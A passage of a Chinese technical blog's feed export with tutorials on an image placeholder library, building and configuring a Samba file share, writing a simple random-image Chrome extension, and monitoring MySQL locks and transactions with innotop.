class="name">pre</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">options</span>=<span class="string">&quot;size=256x128&amp;text=Hello!&quot;</span> <span class="attr">class</span>=<span class="string">&quot;placeholder&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">pre</span>&gt;</span><span class="symbol">&amp;lt;</span>img options=&quot;size=256x128&amp;text=Hello!&amp;bgcolor=#ccc&amp;color=#969696&amp;fstyle=oblique&amp;fweight=bold&amp;fsize=40&amp;ffamily=consolas&quot; class=&quot;placeholder&quot;<span class="symbol">&amp;gt;</span><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">options</span>=<span class="string">&quot;size=256x128&amp;text=Hello!&amp;bgcolor=#ccc&amp;color=#969696&amp;fstyle=oblique&amp;fweight=bold&amp;fsize=40&amp;ffamily=consolas&quot;</span> <span class="attr">class</span>=<span class="string">&quot;placeholder&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">  <span class="comment">// 使用第3类方式需要，执行此方法</span></span></span><br><span class="line"><span class="javascript">  placeholder.render()</span></span><br><span class="line"><span class="javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="四、参考文档"><a href="#四、参考文档" class="headerlink" title="四、参考文档"></a>四、参考文档</h2><p>官方地址：<a href="http://placeholder.cn/">http://placeholder.cn/</a><br>使用实例：<a href="http://placeholder.cn/doc/demo.html">http://placeholder.cn/doc/demo.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;图片占位符，图片由于诸如过大导致浏览器渲染慢、服务器端响应时间过长、页面需要加载的图片过多等原因导致图片未加载。&lt;br&gt;某些图片未成功渲染场景下，希望页面结构能大致保持不变。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注：&lt;/strong&gt; 同类型的先驱：&lt;a href=&quot;http:/</summary>
      
    
    
    
    <category term="前端设计" scheme="http://yeshaoting.cn/categories/%E5%89%8D%E7%AB%AF%E8%AE%BE%E8%AE%A1/"/>
    
    
    <category term="placeholder" scheme="http://yeshaoting.cn/tags/placeholder/"/>
    
    <category term="js类库" scheme="http://yeshaoting.cn/tags/js%E7%B1%BB%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>samba搭建</title>
    <link href="http://yeshaoting.cn/article/linux/samba%E6%90%AD%E5%BB%BA/"/>
    <id>http://yeshaoting.cn/article/linux/samba%E6%90%AD%E5%BB%BA/</id>
    <published>2016-12-30T02:39:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Samba是在Linux和UNIX系统上实现SMB协议的一个免费软件，由服务器及客户端程序构成。SMB（Server Messages Block，信息服务块）是一种在局域网上共享文件和打印机的一种通信协议，它为局域网内的不同计算机之间提供文件及打印机等资源的共享服务.</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p><strong>注意：要安装samba必须有机器的root权限</strong></p><ol><li>下载samba-3.5.8.tar.gz到/home/work/xxx/(此处可以用自己指定path)</li><li>解压tar zxvf samba-3.5.8.tar.gz</li><li>执行 cd samba-3.5.8/source3</li><li>执行 ./configure &amp;&amp; make -j 4</li><li>root权限执行 make install</li></ol><h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><ol><li><p>执行 cd /usr/local/samba/ (默认安装到该路径下)</p></li><li><p>执行 vi lib/smb.conf (将下面的内容粘贴到smb.conf)</p><blockquote><p>[global]<br>diplay charset = utf8<br>unix charset = gbk<br>dos charset = gbk<br>workgroup = work<br>netbios name = work<br>server string = uc<br>security = user<br>[work]<br>comment = uc<br>path=/home/work<br>create mask = 0664<br>directory mask = 0775<br>writable = yes<br>valid users = work<br>browseable = yes</p></blockquote></li><li><p>配置项说明</p><blockquote><p>[global] 标识全局配置： 前三行是对编码的配置。<br>workgroup：设置服务器所要加入的工作组的名称，会在Windows 的“网上邻居”中能看到work工作组，可以在此设置所需要的工作组的名称。<br>netbios name：设置出现在“网上邻居”中的主机名。默认情况下，则使用真正的主机名。<br>server string：设置服务器主机的说明信息，当在Windows 的“网上邻居”中打开Samba 上设置的工作组时，在Windows 的资源管理器窗口，会列出“名称”和“备注”栏，其中“名称”栏会显示出Samba服务器的NetBios名称，而“备注”栏则显示出此处设置的“Samba Server”。当然，可以修改默认的“Sambe Server”，使用自己的描述信息。<br>security：设置Samba服务器的安全等级。默认情况下，使用user等级。<br>Samba服务器一共有四种安全等级：<br>（1）share:使用此等级，用户不需要帐号及密码可以登陆Samba服务器。<br>（2）user:使用此等级，由提供服务的Samba服务器检查用户帐号及密码。<br>（3）server:使用此等级，检查帐号及密码的工作可指定另一台Samba服务器负责。<br>（4）domain:使用此等级，需要指定一台Windows NT/2000/XP服务器（通常为域控制器），以验证用户输入的帐号及密码。<br>[work]标识Samba文件共享配置（中括号中名称任意）<br>comment: 针对共享资源所作的说明、注释部分。<br>path: 若共享资源是目录，则指定目录的位置；若为打印机，则指定打印机队列的位置。<br>create mask: 设置文件的访问权限，默认值为0744。<br>directory mask: 设置目录的访问权限，默认值为0755。<br>writeable: 设置共享的资源是否可以写入。若共享资源是打印机，则不需设置此参数<br>valid users: 设置合法用户名。<br>browseable: 设置用户是否可以看到此共享资源。默认值为yes，若将此参数设置为no，用户虽然看不到此资源，但是拥有权限的用户仍可直接输入该资源的网址来访问该资源</p></blockquote></li></ol><h1 id="启动和使用samba"><a href="#启动和使用samba" class="headerlink" title="启动和使用samba"></a>启动和使用samba</h1><ol><li><p>执行 vi ~/.bash_profile(在文件里添加如下内容), 保存退出</p><blockquote><p>export LD_LIBRARY_PATH=/usr/local/samba/lib:$LD_LIBRARY_PATH</p></blockquote></li><li><p>执行 . ~/.bash_profile</p></li><li><p>执行 ./bin/smbpasswd -a work (设置work的密码)</p></li><li><p>执行 cd /usr/local/samba/sbin</p></li><li><p>执行 ./smbd -D (启动samba)</p></li><li><p>ps auxf | grep smbd 查看进程是否启动; netstat –npl 查看samba端口号，默认会使用139、445两个端口号</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;Samba是在Linux和UNIX系统上实现SMB协议的一个免费软件，由服务器及客户端程序构成。SMB（Server Messages Bl</summary>
      
    
    
    
    <category term="系统配置" scheme="http://yeshaoting.cn/categories/%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/"/>
    
    
    <category term="samba" scheme="http://yeshaoting.cn/tags/samba/"/>
    
    <category term="linux" scheme="http://yeshaoting.cn/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>chrome插件：随机图片欣赏</title>
    <link href="http://yeshaoting.cn/article/js/chrome%E6%8F%92%E4%BB%B6%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%9B%BE%E7%89%87%E6%AC%A3%E8%B5%8F/"/>
    <id>http://yeshaoting.cn/article/js/chrome%E6%8F%92%E4%BB%B6%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%9B%BE%E7%89%87%E6%AC%A3%E8%B5%8F/</id>
    <published>2016-12-29T03:17:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<p>完整源码参见：<a href="https://github.com/yeshaoting/chrome-plugin-study/tree/master/start">https://github.com/yeshaoting/chrome-plugin-study/tree/master/start</a></p><h2 id="一、插件文件"><a href="#一、插件文件" class="headerlink" title="一、插件文件"></a>一、插件文件</h2><h3 id="1-清单文件：manifest-json"><a href="#1-清单文件：manifest-json" class="headerlink" title="1. 清单文件：manifest.json"></a>1. 清单文件：manifest.json</h3><p>清单是chrome插件的入口，所有插件都要有这个文件。</p><p>包含插件的一些描述信息，例如：插件名称、版本号、允许请求的地址、展示的图标等。</p><p><strong>注：</strong>文件名称必须为maifest.json</p><h4 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;manifest_version&quot;: 2,</span><br><span class="line"></span><br><span class="line">  &quot;name&quot;: &quot;图片欣赏&quot;,</span><br><span class="line">  &quot;description&quot;: &quot;随机图片欣赏&quot;,</span><br><span class="line">  &quot;version&quot;: &quot;1.0&quot;,</span><br><span class="line"></span><br><span class="line">  &quot;permissions&quot;: [</span><br><span class="line">    &quot;https://secure.flickr.com/&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;browser_action&quot;: &#123;</span><br><span class="line">    &quot;default_icon&quot;: &quot;images/icon.png&quot;,</span><br><span class="line">    &quot;default_popup&quot;: &quot;popup.html&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-资源文件"><a href="#2-资源文件" class="headerlink" title="2. 资源文件"></a>2. 资源文件</h3><p>清单文件添加的图标(images/icon.png)、插件点击后弹出页面(popup.html)等。</p><p>资源文件都是在清单中定义的，通过清单描述找到。</p><h2 id="二、插件内页"><a href="#二、插件内页" class="headerlink" title="二、插件内页"></a>二、插件内页</h2><h3 id="1-功能"><a href="#1-功能" class="headerlink" title="1. 功能"></a>1. 功能</h3><p>本插件要实现的功能：</p><ul><li>展示一批图片</li><li>批量更换所有图片</li><li>更换单个图片</li></ul><h3 id="2-随机图片接口"><a href="#2-随机图片接口" class="headerlink" title="2. 随机图片接口"></a>2. 随机图片接口</h3><p>现成的API接口：<a href="https://unsplash.it/300/300/?random=1">https://unsplash.it/300/300/?random=1</a></p><p>其中，random后面的值可以随机。</p><p><strong>注：</strong>接口存在一个问题，在同一个页面random值相同的话，页面展示的图片是相同的。因此，要保证初始页面的所有random值不一致。</p><h3 id="3-点击事件"><a href="#3-点击事件" class="headerlink" title="3. 点击事件"></a>3. 点击事件</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 换一批</span></span><br><span class="line">  $(<span class="string">&quot;div.head a.refresh&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> images = $(<span class="string">&quot;a.thumbnail img&quot;</span>).each(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      change_img($(<span class="built_in">this</span>));</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 单独更换</span></span><br><span class="line">  $(<span class="string">&quot;a.thumbnail img&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    change_img($(<span class="built_in">this</span>));</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">change_img</span>(<span class="params">$obj</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> url = <span class="string">&quot;https://unsplash.it/300/300/?random=&quot;</span> + <span class="built_in">Math</span>.random();</span><br><span class="line">    $obj.attr(<span class="string">&quot;src&quot;</span>, url);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="三、插件加载"><a href="#三、插件加载" class="headerlink" title="三、插件加载"></a>三、插件加载</h2><p>进入chrome扩展程序，勾选右上方开发者模式，然后点击“加载已解压的扩展程序”。</p><p>在弹出的文件查看对话框，选择开发的插件在磁盘上的存放位置。</p><p>确认完成后，就能看到开发的插件“图片欣赏”，展示在下面的扩展程序列表里了。</p><p>在chrome地址栏右侧的扩展插件中，就能看到并使用刚开发的插件了。</p><p><img src="http://7xkl4i.com1.z0.glb.clouddn.com/blog/Snip20161229_42.png" alt="加载插件"></p><h2 id="四、效果图"><a href="#四、效果图" class="headerlink" title="四、效果图"></a>四、效果图</h2><h3 id="1-插件效果图"><a href="#1-插件效果图" class="headerlink" title="1. 插件效果图"></a>1. 插件效果图</h3><p><img src="http://7xkl4i.com1.z0.glb.clouddn.com/blog/Snip20161229_40.png" alt="插件效果图"></p><h3 id="2-独立页面效果"><a href="#2-独立页面效果" class="headerlink" title="2. 独立页面效果"></a>2. 独立页面效果</h3><p><img src="http://7xkl4i.com1.z0.glb.clouddn.com/blog/Snip20161229_41.png" alt="独立页面效果"></p><h2 id="五、参考文档"><a href="#五、参考文档" class="headerlink" title="五、参考文档"></a>五、参考文档</h2><ul><li><a href="https://crxdoc-zh.appspot.com/extensions/getstarted">入门：建立 Chrome 扩展程序</a></li><li><a href="http://www.cnblogs.com/guogangj/p/3235703.html">Chrome插件（Extensions）开发攻略</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;完整源码参见：&lt;a href=&quot;https://github.com/yeshaoting/chrome-plugin-study/tree/master/start&quot;&gt;https://github.com/yeshaoting/chrome-plugin-study/tr</summary>
      
    
    
    
    <category term="前端设计" scheme="http://yeshaoting.cn/categories/%E5%89%8D%E7%AB%AF%E8%AE%BE%E8%AE%A1/"/>
    
    
    <category term="chrome插件" scheme="http://yeshaoting.cn/tags/chrome%E6%8F%92%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>命令行监控工具Innotop</title>
    <link href="http://yeshaoting.cn/article/database/%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%9B%91%E6%8E%A7%E5%B7%A5%E5%85%B7Innotop/"/>
    <id>http://yeshaoting.cn/article/database/%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%9B%91%E6%8E%A7%E5%B7%A5%E5%85%B7Innotop/</id>
    <published>2016-08-28T12:21:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="命令行监控工具Innotop"><a href="#命令行监控工具Innotop" class="headerlink" title="命令行监控工具Innotop"></a>命令行监控工具Innotop</h1><h2 id="一、工具简介"><a href="#一、工具简介" class="headerlink" title="一、工具简介"></a>一、工具简介</h2><p>innotop是一个基于命令行的监控工具，在某种方面模拟了UNIX中的top工具。</p><p>类似的命令行监控工具还有mtop和mytop，不过都不如innotop功能强大。</p><blockquote><p>INNOTOP是一个通过文本模式显示MySQL和InnoDB的监测工具。INNOTOP是用PERL语言写成的，这使它能更加灵活的使用在各种操作平台之上，它能详细的监控出当前MYSQL和INNODB运行的状态，以DBA根据结果，可以合理的优化MYSQL，让MYSQL更稳定更高效的运行。(摘自：参考文档3)</p></blockquote><h2 id="二、功能特性"><a href="#二、功能特性" class="headerlink" title="二、功能特性"></a>二、功能特性</h2><p>既然说到innotop功能很强大，到底能用来帮助我们做什么事情呢？</p><p>可以看一下innotop的功能特性如下：</p><ul><li>事务列表可以显示INNODB当前的全部事务。</li><li>查询列表可以显示当前正在运行的查询。</li><li>可以显示当前锁和锁等待的列表。</li><li>以相对值 显示服务器状态的变量和汇总信息。</li><li>有多种模式可用来显示INNODB内部信息，例如：缓冲区、死锁、外键错误、I/O活动情况、行操作、信号量以及其他更多的内容。</li><li>复制监控，将主服务器和从服务器的状态显示在一起。</li><li>显示任意服务器变量的模式。</li><li>服务器组可以更方便地组织多台服务器。</li><li>在命令行脚本下可以使用非交互式模式。</li></ul><h2 id="三、工具安装"><a href="#三、工具安装" class="headerlink" title="三、工具安装"></a>三、工具安装</h2><h3 id="1-源码安装"><a href="#1-源码安装" class="headerlink" title="1. 源码安装"></a>1. 源码安装</h3><p>最早innotop代码被托管到google code上，后来迁移到了github：<a href="https://github.com/innotop/innotop">innotop</a></p><p>下载innotop源码，运行标准的make install安装过程即可。</p><p><strong>PS</strong>：八过网上的安装方式大多针对于linux系统而言。本人尝试在本机MAC系统下安装并没有那么简单，卡在安装perl的mysql连接库这块。MAC用户可以尝试使用下面的方法安装。</p><h3 id="2-brew安装"><a href="#2-brew安装" class="headerlink" title="2. brew安装"></a>2. brew安装</h3><p>通过MAC包管理工具brew搜索并安装innotop。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">brew search innotop</span><br><span class="line">brew install innotop</span><br></pre></td></tr></table></figure><p>本人安装的innotop版本为1.11.1。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yerba-buena:~ yeshaoting$ innotop --version</span><br><span class="line">innotop  Ver 1.11.1</span><br></pre></td></tr></table></figure><span id="more"></span><h2 id="四、使用方法"><a href="#四、使用方法" class="headerlink" title="四、使用方法"></a>四、使用方法</h2><h3 id="1-帮助信息"><a href="#1-帮助信息" class="headerlink" title="1. 帮助信息"></a>1. 帮助信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">yerba-buena:~ yeshaoting$ innotop --help</span><br><span class="line">Usage: innotop &lt;options&gt; &lt;innodb-status-file&gt;</span><br><span class="line"></span><br><span class="line">  --askpass          Prompt for a password when connecting to MySQL</span><br><span class="line">  --[no]color   -C   Use terminal coloring (default)</span><br><span class="line">  --config      -c   Config file to read</span><br><span class="line">  --count            Number of updates before exiting</span><br><span class="line">  --delay       -d   Delay between updates in seconds</span><br><span class="line">  --help             Show this help message</span><br><span class="line">  --host        -h   Connect to host</span><br><span class="line">  --[no]inc     -i   Measure incremental differences</span><br><span class="line">  --mode        -m   Operating mode to start in</span><br><span class="line">  --nonint      -n   Non-interactive, output tab-separated fields</span><br><span class="line">  --password    -p   Password to use for connection</span><br><span class="line">  --port        -P   Port number to use for connection</span><br><span class="line">  --skipcentral -s   Skip reading the central configuration file</span><br><span class="line">  --socket      -S   MySQL socket to use for connection</span><br><span class="line">  --spark            Length of status sparkline (default 10)</span><br><span class="line">  --timestamp   -t   Print timestamp in -n mode (1: per iter; 2: per line)</span><br><span class="line">  --user        -u   User for login if not current user</span><br><span class="line">  --version          Output version information and exit</span><br><span class="line">  --write       -w   Write running configuration into home directory if no config files were loaded</span><br><span class="line"></span><br><span class="line">innotop is a MySQL and InnoDB transaction/status monitor, like &#x27;top&#x27; for</span><br><span class="line">MySQL.  It displays queries, InnoDB transactions, lock waits, deadlocks,</span><br><span class="line">foreign key errors, open tables, replication status, buffer information,</span><br><span class="line">row operations, logs, I/O operations, load graph, and more.  You can</span><br><span class="line">monitor many servers at once with innotop.</span><br></pre></td></tr></table></figure><p>查看innotop的帮助信息可以知道innotop使用方法及参数类似于mysql连接方法。</p><p>innotop监控本机mysql方式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">innotop -uroot -proot -h127.0.0.1</span><br></pre></td></tr></table></figure><h3 id="2-监控模式"><a href="#2-监控模式" class="headerlink" title="2. 监控模式"></a>2. 监控模式</h3><p>进入innotop命令行默认进入的<strong>Dashboard</strong>模式。</p><p>innotop总共有15种监控模式可供切换。如下所示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[RO] Dashboard (? for help)                                                                                                                         localhost, 17d, 0.75 QPS, 3/1/1 con/run/cac thds, 5.6.27</span><br><span class="line"></span><br><span class="line">Switch to a different mode:</span><br><span class="line">   A  Dashboard         I  InnoDB I/O Info     Q  Query List</span><br><span class="line">   B  InnoDB Buffers    K  InnoDB Lock Waits   R  InnoDB Row Ops</span><br><span class="line">   C  Command Summary   L  Locks               S  Variables &amp; Status</span><br><span class="line">   D  InnoDB Deadlocks  M  Replication Status  T  InnoDB Txns</span><br><span class="line">   F  InnoDB FK Err     O  Open Tables         U  User Statistics</span><br><span class="line"></span><br><span class="line">Actions:</span><br><span class="line">   d  Change refresh interval        q  Quit innotop</span><br><span class="line">   k  Kill a query&#x27;s connection      r  Reverse sort order</span><br><span class="line">   n  Switch to the next connection  s  Choose sort column</span><br><span class="line">   p  Pause innotop                  x  Kill a query</span><br><span class="line"></span><br><span class="line">Other:</span><br><span class="line"> TAB  Switch to the next server group   /  Quickly filter what you see</span><br><span class="line">   !  Show license and warranty         =  Toggle aggregation</span><br><span class="line"><span class="meta">   #</span><span class="bash">  Select/create server groups       @  Select/create server connections</span></span><br><span class="line"><span class="meta">   $</span><span class="bash">  Edit configuration settings       \  Clear quick-filters</span></span><br><span class="line">Press any key to continue</span><br></pre></td></tr></table></figure><p><strong>注</strong>：监控默认情况每10秒刷新一下，可以通过<strong>d</strong>命令更新刷新频率。</p><h2 id="五、工具实践"><a href="#五、工具实践" class="headerlink" title="五、工具实践"></a>五、工具实践</h2><p>测试表t数据如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql root@localhost:test&gt; select * from t;</span><br><span class="line">+------+---------+</span><br><span class="line">|   id |   stage |</span><br><span class="line">|------+---------|</span><br><span class="line">|    1 |       1 |</span><br><span class="line">|    4 |       4 |</span><br><span class="line">|    9 |       9 |</span><br><span class="line">|   15 |      15 |</span><br><span class="line">+------+---------+</span><br></pre></td></tr></table></figure><p>起两个事务T1、T2用于测试。两事务时序表如下：</p><table><thead><tr><th align="center">T1</th><th align="center">T2</th></tr></thead><tbody><tr><td align="center">begin;</td><td align="center"></td></tr><tr><td align="center"></td><td align="center">begin;</td></tr><tr><td align="center">select * from t where id = 9 lock in share mode;</td><td align="center"></td></tr><tr><td align="center"></td><td align="center">select * from t where id  = 4 for update;</td></tr></tbody></table><h3 id="1-当前所有事务"><a href="#1-当前所有事务" class="headerlink" title="1. 当前所有事务"></a>1. 当前所有事务</h3><p>innotop界面<strong>SHIFT + T</strong>查看当前事务状态，如下所示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[RO] InnoDB Txns (? for help)                                                                                                        localhost, 17d, InnoDB 4s :-), 0.62 QPS, 3/1/1 con/run/cac thds, 5.6.27</span><br><span class="line"></span><br><span class="line">History  Versions  Undo  Dirty Buf  Used Bufs  Txns  MaxTxnTime  LStrcts</span><br><span class="line">    975                      0.00%      5.27%     3       02:28</span><br><span class="line"></span><br><span class="line">ID  User       Host  Txn Status  Time   Undo  Query Text</span><br><span class="line">49  localhost        ACTIVE      02:28     0</span><br><span class="line">47  localhost        ACTIVE      02:11     0</span><br></pre></td></tr></table></figure><p>由上可看出，T1和T2 session ID分别为47和49，事务执行时长分别为1小时和11分钟。</p><h3 id="2-查询当前锁状态"><a href="#2-查询当前锁状态" class="headerlink" title="2. 查询当前锁状态"></a>2. 查询当前锁状态</h3><p>安装好innotop工具之后，Lock模式只系那是当前wait的锁状况，而不显示当前持有锁的记录。innotop监控依赖于innodb监控开启状态(参见：<a href="http://yeshaoting.cn/article/database/%E5%BC%80%E5%90%AFInnoDB%E7%9B%91%E6%8E%A7/">开启InnoDB监控</a>)。</p><p>具体方法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">GLOBAL</span> innodb_status_output<span class="operator">=</span><span class="keyword">ON</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">GLOBAL</span> innodb_status_output_locks<span class="operator">=</span><span class="keyword">ON</span>;</span><br></pre></td></tr></table></figure><p>innotop界面<strong>SHIFT + L</strong>查看所有事务锁占用状态，如下所示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[RO] Locks (? for help)                                                                                                              localhost, 17d, InnoDB 7s :-), 0.20 QPS, 3/1/1 con/run/cac thds, 5.6.27</span><br><span class="line"></span><br><span class="line">______________________________________ InnoDB Locks _______________________________________</span><br><span class="line">ID  Type    Waiting  Wait   Active  Mode  DB    Table  Index    Ins Intent  Special</span><br><span class="line">47  TABLE         0  00:00   03:55  IS    test  t                        0</span><br><span class="line">47  RECORD        0  00:00   03:55  S     test  t      PRIMARY           0  rec but not gap</span><br><span class="line">49  TABLE         0  00:00   04:12  IX    test  t                        0</span><br><span class="line">49  RECORD        0  00:00   04:12  X     test  t      PRIMARY           0  rec but not gap</span><br></pre></td></tr></table></figure><p>由上可看出，T1事务加了两把锁：表t上的表锁IS和共享记录锁S rec but not gap，T2事务也加了两把锁：表t上的表锁IX和记录前的排他间隙锁X rec but not gap。</p><h3 id="3-查看锁等待情况"><a href="#3-查看锁等待情况" class="headerlink" title="3. 查看锁等待情况"></a>3. 查看锁等待情况</h3><p>在事务T1中再执行如下命令：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t <span class="keyword">where</span> id  <span class="operator">=</span> <span class="number">4</span> <span class="keyword">for</span> update;</span><br></pre></td></tr></table></figure><p>innotop界面<strong>SHIFT + K</strong>等待锁的事务，如下所示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[RO] InnoDB Lock Waits (? for help)                                                                                                                localhost, 17d, 21.89 QPS, 3/0/0 con/run/cac thds, 5.6.27</span><br><span class="line"></span><br><span class="line">WThread  Waiting Query  WWait  BThread  BRowsMod  BAge  BWait  BStatus   Blocking Query</span><br><span class="line">     47  SELECT t          2s       49         0    7m         Sleep 76</span><br></pre></td></tr></table></figure><p>由上可看出，session ID为47的事务(即：事务T1)正在等待其他事务session ID为49的事务(即：事务T2)释放锁。锁等待时长为2秒。</p><h3 id="4-其他模式"><a href="#4-其他模式" class="headerlink" title="4. 其他模式"></a>4. 其他模式</h3><p>通过 <strong>SHIFT + O</strong>可以查看当前打开的表，通过 <strong>SHIFT + I</strong>可以查看INNODB当前I/O状态。</p><p>模式的更多用法等待大家后续慢慢挖掘。</p><h2 id="六、参考文档"><a href="#六、参考文档" class="headerlink" title="六、参考文档"></a>六、参考文档</h2><ol><li>高性能MySQL3</li><li><a href="https://www.percona.com/blog/2013/10/14/innotop-real-time-advanced-investigation-tool-mysql/">Innotop: A real-time, advanced investigation tool for MySQL</a></li><li><a href="http://www.cnblogs.com/ivictor/p/5101506.html">MySQL监控利器-Innotop</a></li></ol>]]></content>
    
    
